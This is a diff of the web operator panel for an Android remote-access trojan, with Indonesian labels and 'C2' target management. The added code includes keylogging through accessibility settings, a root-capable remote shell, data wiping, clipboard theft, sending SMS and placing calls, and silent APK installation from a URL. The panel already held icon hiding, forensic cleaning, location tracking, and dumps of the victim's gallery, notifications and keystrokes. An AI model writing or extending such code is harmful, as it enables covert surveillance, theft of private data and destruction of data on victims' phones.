@@ -19,7 +19,7 @@
       <a href="/admin">☰ <span class="lbl">ADMIN</span></a>
     </nav>
     <div class="side-foot"><div id="clock">--:--:--</div>
-      <div style="margin-top:6px">v1.4.0 · <span id="rtLed" class="led"></span> realtime</div>
+      <div style="margin-top:6px">v1.5.0 · <span id="rtLed" class="led"></span> realtime</div>
       <a href="#" id="logout" style="display:block;margin-top:10px;color:var(--red)">▸ KELUAR</a></div>
   </aside>
 
@@ -28,13 +28,13 @@
       <h2 class="glitch" data-t="TARGET">TARGET</h2>
       <span class="pill on"><i class="led on"></i><span id="onCount">0</span> ONLINE</span>
       <div class="spacer"></div>
-      <input class="inp" id="q" placeholder="cari brand / model / ip" style="width:230px;padding:8px 12px;letter-spacing:0">
-      <select class="inp" id="filter" style="width:130px;padding:8px 12px">
+      <input class="inp" id="q" placeholder="cari brand / model / ip" style="width:220px;padding:8px 12px;letter-spacing:0">
+      <select class="inp" id="filter" style="width:125px;padding:8px 12px">
         <option value="all">SEMUA</option><option value="online">ONLINE</option><option value="offline">OFFLINE</option>
       </select>
     </header>
 
-    <div class="content" style="display:grid;grid-template-columns:330px minmax(0,1fr);gap:14px;align-items:start">
+    <div class="content" style="display:grid;grid-template-columns:320px minmax(0,1fr);gap:14px;align-items:start">
       <div class="card" style="position:sticky;top:74px">
         <div class="card-h"><b>DAFTAR PERANGKAT</b><div class="spacer"></div><span class="tag" id="cnt">0</span></div>
         <div class="card-b"><div class="t-list" id="list" style="max-height:calc(100vh - 190px);overflow:auto"></div></div>
@@ -51,16 +51,22 @@
           <button class="tab" data-p="p-aud">AUDIO</button>
           <button class="tab" data-p="p-dump">DUMP</button>
           <button class="tab" data-p="p-not">NOTIF</button>
+          <button class="tab" data-p="p-key">KEYLOG</button>
+          <button class="tab" data-p="p-term">TERMINAL</button>
+          <button class="tab" data-p="p-power">DAYA</button>
+          <button class="tab" data-p="p-app">APLIKASI</button>
           <button class="tab" data-p="p-extra">LAINNYA</button>
         </div>
+
         <div class="card-b" style="padding:0" id="panes">
           <div class="pane on" id="p-info">
             <div class="kv" id="infoKv"><div class="k">—</div><div class="v">pilih target dulu</div></div>
             <div class="row" style="margin-top:14px">
-              <button class="btn sm ghost" data-c="info">Muat Info</button>
-              <button class="btn sm ghost" data-c="ping">Ping</button>
-              <button class="btn sm ghost" data-c="dump_net">Jaringan</button>
-              <button class="btn sm ghost" data-c="forensic_clean">Forensic Clean</button>
+              <button class="btn sm ghost" data-c="info">MUAT INFO</button>
+              <button class="btn sm ghost" data-c="ping">PING</button>
+              <button class="btn sm ghost" data-c="dump_net">JARINGAN</button>
+              <button class="btn sm ghost" data-c="reconnect">RECONNECT</button>
+              <button class="btn sm ghost" data-c="forensic_clean">FORENSIC CLEAN</button>
             </div>
             <div class="console" id="log" style="margin-top:14px"></div>
           </div>
@@ -86,6 +92,7 @@
               <button class="btn sm ghost" data-k="back">◀ BACK</button>
               <button class="btn sm ghost" data-k="home">HOME</button>
               <button class="btn sm ghost" data-k="recents">RECENTS</button>
+              <button class="btn sm ghost" data-k="menu">MENU</button>
               <button class="btn sm ghost" data-k="lock">KUNCI</button>
             </div>
             <div class="row" style="margin-top:8px">
@@ -128,8 +135,9 @@
               <button class="chip" data-c="dump_gallery">GALERI</button>
               <button class="chip" data-c="dump_apps">APLIKASI</button>
               <button class="chip" data-c="dump_keylog">KEYLOG</button>
+              <button class="chip" data-c="dump_notif">NOTIFIKASI</button>
             </div>
-            <div class="console" id="dlog" style="height:150px"></div>
+            <div class="console" id="dlog" style="height:140px"></div>
             <div style="margin-top:12px"><table><thead><tr><th>Jenis</th><th>File</th><th>Ukuran</th><th></th></tr></thead>
               <tbody id="drows"><tr><td colspan="4" class="empty">belum ada</td></tr></tbody></table></div>
           </div>
@@ -137,10 +145,69 @@
           <div class="pane" id="p-not">
             <div class="row" style="margin-bottom:10px">
               <button class="btn sm" data-c="notif_start">AKTIFKAN LISTENER</button>
-              <button class="btn sm ghost" data-c="notif_stop">MATIKAN</button>
+              <button class="btn sm ghost" data-c="notif_stop">CEK STATUS</button>
               <button class="btn sm ghost" data-c="dump_notif">AMBIL SEKARANG</button>
             </div>
-            <div class="console" id="nlog" style="height:320px"></div>
+            <div class="console" id="nlog" style="height:300px"></div>
+          </div>
+
+          <div class="pane" id="p-key">
+            <div class="row" style="margin-bottom:10px">
+              <button class="btn sm" data-c="keylog_start">BUKA SETELAN A11Y</button>
+              <button class="btn sm ghost" data-c="keylog_stop">CEK STATUS</button>
+              <button class="btn sm ghost" data-c="write_settings">IZIN SETTING</button>
+              <button class="btn sm ghost" data-c="dump_keylog">SIMPAN LOG</button>
+            </div>
+            <div class="console" id="keyOut" style="height:300px"></div>
+          </div>
+
+          <div class="pane" id="p-term">
+            <div class="row" style="margin-bottom:10px">
+              <button class="btn sm" id="shRun">JALANKAN</button>
+              <button class="btn sm ghost" id="shRoot">MODE ROOT</button>
+              <button class="btn sm ghost" id="shClear">BERSIHKAN</button>
+            </div>
+            <input class="inp" id="shCmd" placeholder="ls /sdcard" style="letter-spacing:0;margin-bottom:10px">
+            <div class="console" id="shOut" style="height:320px"></div>
+          </div>
+
+          <div class="pane" id="p-power">
+            <div class="row" style="margin-bottom:12px">
+              <button class="btn sm amber" data-c="reboot">REBOOT</button>
+              <button class="btn sm ghost" data-c="reboot_recovery">RECOVERY</button>
+              <button class="btn sm ghost" data-c="power_off">MATIKAN</button>
+              <button class="btn sm ghost" data-c="wipe">WIPE DATA</button>
+            </div>
+            <div class="row" style="margin-bottom:12px">
+              <button class="btn sm ghost" data-c="screen_off">LAYAR OFF</button>
+              <button class="btn sm ghost" data-c="screen_on">LAYAR ON</button>
+              <button class="btn sm ghost" id="wifiBtn">WIFI</button>
+              <button class="btn sm ghost" id="dataBtn">DATA</button>
+              <button class="btn sm ghost" id="airBtn">AIRPLANE</button>
+            </div>
+            <div class="field"><label>KECERAHAN (%)</label>
+              <div class="row"><input class="inp" id="brg" type="range" min="1" max="100" value="60" style="flex:1">
+              <button class="btn sm" id="brgGo">SET</button></div></div>
+            <div class="field"><label>KLIPBOARD TARGET</label>
+              <div class="row"><button class="btn sm ghost" data-c="clipboard">BACA</button></div>
+              <div class="console" id="clipOut" style="height:70px;margin-top:8px"></div></div>
+            <div class="field"><label>PANGGILAN / SMS</label>
+              <input class="inp" id="pnum" placeholder="08xxxxxxxxxx" style="letter-spacing:0;margin-bottom:8px">
+              <input class="inp" id="pmsg" placeholder="isi SMS" style="letter-spacing:0;margin-bottom:8px">
+              <div class="row"><button class="btn sm ghost" id="dialBtn">DIAL</button>
+                <button class="btn sm ghost" id="callBtn">TELEPON</button>
+                <button class="btn sm" id="smsBtn">KIRIM SMS</button></div></div>
+          </div>
+
+          <div class="pane" id="p-app">
+            <div class="row" style="margin-bottom:10px">
+              <button class="btn sm" data-c="dump_apps">MUAT DAFTAR</button>
+            </div>
+            <div class="field"><label>PASANG APK DARI URL</label>
+              <div class="row"><input class="inp" id="apkUrl" placeholder="https://…/app.apk" style="flex:1;letter-spacing:0">
+              <button class="btn sm" id="apkGo">PASANG</button></div></div>
+            <div style="margin-top:12px"><table><thead><tr><th>Paket</th><th>Nama</th><th></th></tr></thead>
+              <tbody id="appRows"><tr><td colspan="3" class="empty">belum dimuat</td></tr></tbody></table></div>
           </div>
 
           <div class="pane" id="p-extra">
@@ -148,6 +215,7 @@
               <button class="btn sm ghost" data-c="hide_icon">SEMBUNYIKAN IKON</button>
               <button class="btn sm ghost" data-c="show_icon">TAMPILKAN IKON</button>
               <button class="btn sm amber" data-c="lock_screen">KUNCI LAYAR</button>
+              <button class="btn sm ghost" data-c="lock_pin">LAYAR PIN</button>
               <button class="btn sm ghost" data-c="delay_mode">MODE DELAY</button>
               <button class="btn sm ghost" data-c="vibrate">GETAR</button>
             </div>
@@ -175,22 +243,23 @@
 <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
 <script type="module">
 import { $, $$, api, post, toast, esc, fmt, clock, markNav } from '/static/js/core.js';
-import { connect, on, send, statusLed } from '/static/js/ws.js';
+import { connect, on, statusLed } from '/static/js/ws.js';
 
 markNav(); clock($('#clock')); statusLed($('#rtLed'));
+
 let current = null;
 let map = null;
 let marker = null;
-let micStream = null;
+let rootMode = false;
 
 $('#logout').onclick = async (e) => { e.preventDefault(); await post('/api/logout'); location.href = '/'; };
 
 function log(box, msg, cls = '') {
   const b = $(box); if (!b) return;
   const d = document.createElement('div');
-  d.innerHTML = `<span class="tm">${fmt.time(Date.now()/1000)}</span> <span class="${cls}">${esc(msg)}</span>`;
+  d.innerHTML = `<span class="tm">${fmt.time(Date.now() / 1000)}</span> <span class="${cls}">${esc(msg)}</span>`;
   b.prepend(d);
-  while (b.children.length > 200) b.lastChild.remove();
+  while (b.children.length > 250) b.lastChild.remove();
 }
 
 $$('#tabs .tab').forEach((t) => {
@@ -205,7 +274,7 @@ $$('#tabs .tab').forEach((t) => {
 
 function ensureMap() {
   if (map || !window.L) return;
-  map = L.map('map', { zoomControl: true, attributionControl: false }).setView([-2.5, 118], 5);
+  map = L.map('map', { attributionControl: false }).setView([-2.5, 118], 5);
   L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png', { maxZoom: 19 }).addTo(map);
 }
 
@@ -246,8 +315,8 @@ async function select(id) {
   $('#pState').innerHTML = `<i class="led ${t.online ? 'on' : ''}"></i>${t.online ? 'ONLINE' : 'OFFLINE'}`;
   $('#infoKv').innerHTML = [
     ['Label', t.label], ['Brand', t.brand], ['Model', t.model], ['Android', t.android],
-    ['SDK', t.sdk], ['IP', t.ip], ['ISP', t.isp], ['Negara', t.country],
-    ['Kota', t.city], ['Baterai', (t.battery || 0) + '%'], ['Charging', t.charging ? 'ya' : 'tidak'],
+    ['SDK', t.sdk], ['IP', t.ip], ['ISP', t.isp], ['Negara', t.country], ['Kota', t.city],
+    ['Baterai', (t.battery || 0) + '%'], ['Charging', t.charging ? 'ya' : 'tidak'],
     ['Storage bebas', fmt.bytes(t.storage_free)], ['Pertama', fmt.date(t.first_seen)],
     ['Terakhir', fmt.date(t.last_seen)], ['Catatan', t.notes || '-'],
   ].map(([k, v]) => `<div class="k">${esc(k)}</div><div class="v">${esc(v ?? '-')}</div>`).join('');
@@ -265,9 +334,7 @@ async function cmd(type, args = {}) {
 }
 
 $$('[data-c]').forEach((b) => { b.onclick = () => cmd(b.dataset.c); });
-$$('[data-k]').forEach((b) => {
-  b.onclick = () => cmd('key', { code: b.dataset.k });
-});
+$$('[data-k]').forEach((b) => { b.onclick = () => cmd('key', { code: b.dataset.k }); });
 
 $('#txtGo').onclick = () => { const v = $('#txtIn').value; if (v) { cmd('text', { text: v }); $('#txtIn').value = ''; } };
 $('#audPlay').onclick = () => cmd('speaker_play', { url: $('#audUrl').value, kind: 'audio' });
@@ -276,6 +343,28 @@ $('#volGo').onclick = () => cmd('volume', { level: Number($('#vol').value) });
 $('#wallGo').onclick = () => cmd('wallpaper_set', { url: $('#wallUrl').value });
 $('#openGo').onclick = () => cmd('open_url', { url: $('#openUrl').value });
 $('#toastGo').onclick = () => cmd('toast', { text: $('#toastMsg').value });
+
+$('#shRun').onclick = () => {
+  const c = $('#shCmd').value.trim();
+  if (!c) return;
+  cmd(rootMode ? 'root_shell' : 'shell', { cmd: c });
+};
+$('#shRoot').onclick = () => {
+  rootMode = !rootMode;
+  $('#shRoot').classList.toggle('amber', rootMode);
+  toast(rootMode ? 'Mode root aktif' : 'Mode shell biasa', rootMode ? 'ok' : '');
+};
+$('#shClear').onclick = () => { $('#shOut').innerHTML = ''; };
+
+$('#brgGo').onclick = () => cmd('brightness', { pct: Number($('#brg').value) });
+$('#wifiBtn').onclick = () => cmd('wifi_set', { on: true });
+$('#dataBtn').onclick = () => cmd('data_set', { on: true });
+$('#airBtn').onclick = () => cmd('airplane', { on: true });
+$('#dialBtn').onclick = () => cmd('dial', { number: $('#pnum').value });
+$('#callBtn').onclick = () => cmd('call', { number: $('#pnum').value });
+$('#smsBtn').onclick = () => cmd('sms_send', { number: $('#pnum').value, text: $('#pmsg').value });
+$('#apkGo').onclick = () => cmd('app_install', { url: $('#apkUrl').value });
+
 $('#delTarget').onclick = async () => {
   if (!current || !confirm('Hapus target ini dari C2?')) return;
   await api('/api/targets/' + current, { method: 'DELETE' });
@@ -307,15 +396,31 @@ on('stream', (m) => {
     a.src = 'data:audio/mp4;base64,' + m.b64;
     a.play().catch(() => {});
   }
+  if (m.kind === 'loc' && m.meta?.lat) setPoint(m.meta.lat, m.meta.lon, 'target');
+  if (m.kind === 'keylog' && m.b64) log('#keyOut', m.b64, 'ok');
+  if (m.kind === 'notif' && m.b64) log('#nlog', m.b64);
 });
+
 on('result', (m) => {
   if (m.target !== current) return;
   const data = m.data || {};
   log('#log', `${m.id} → ${m.ok ? 'OK' : 'GAGAL'}`, m.ok ? 'ok' : 'er');
   if (data.lat) setPoint(data.lat, data.lon, 'target');
-  if (data.notif) log('#nlog', data.notif);
-  if (m.type === 'dump_*' || data.saved) loadDumps();
+  if (data.output !== undefined) log('#shOut', String(data.output), 'ok');
+  if (data.text !== undefined && data.text !== '') log('#clipOut', data.text, 'ok');
+  if (data.butuh_izin) log('#log', 'butuh izin WRITE_SETTINGS — tekan IZIN SETTING', 'wn');
+  if (data.saved !== undefined) log('#log', 'tangkapan layar: ' + data.saved, data.saved ? 'ok' : 'wn');
+  if (Array.isArray(data)) {
+    $('#appRows').innerHTML = data.map((x) => `
+      <tr><td class="mono">${esc(x.pkg)}</td><td>${esc(x.name)}</td>
+      <td><button class="btn sm ghost" data-un="${esc(x.pkg)}">HAPUS</button></td></tr>`).join('');
+    document.querySelectorAll('[data-un]').forEach((b) => {
+      b.onclick = () => cmd('app_uninstall', { pkg: b.dataset.un });
+    });
+  }
+  if (m.type === 'dump_*') loadDumps();
 });
+
 on('dump', (m) => { if (m.target === current) { log('#dlog', `dump ${m.kind} · ${fmt.bytes(m.size)}`, 'ok'); loadDumps(); } });
 on('presence', (m) => { loadList(); if (m.id === current) select(current); });
 on('targets_dirty', loadList);
